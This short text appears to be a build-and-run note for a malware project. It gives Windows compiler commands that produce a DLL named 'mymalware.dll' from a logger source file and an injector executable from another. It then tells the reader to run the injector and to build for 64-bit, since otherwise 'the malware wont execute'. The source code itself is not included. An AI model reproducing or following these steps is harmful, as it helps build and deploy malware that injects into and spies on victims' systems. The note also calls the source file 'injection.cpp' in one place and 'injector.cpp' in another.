compilationg for logger.cpp:
cl /LD /EHsc logger.cpp /Fe:mymalware.dll /link kernel32.lib user32.lib wininet.lib gdiplus.lib shell32.lib advapi32.lib gdi32.lib ole32.lib

compilationg for injection.cpp:
cl /EHsc injector.cpp /Fe:injector.exe /link kernel32.lib user32.lib advapi32.lib 

running: ./injector or injector.exe

instruction: Run the commands in developer command prompt and ensure the compiled files are in 64 bit architecture, if u compile in 32 bit it wont run and the malware wont execute.
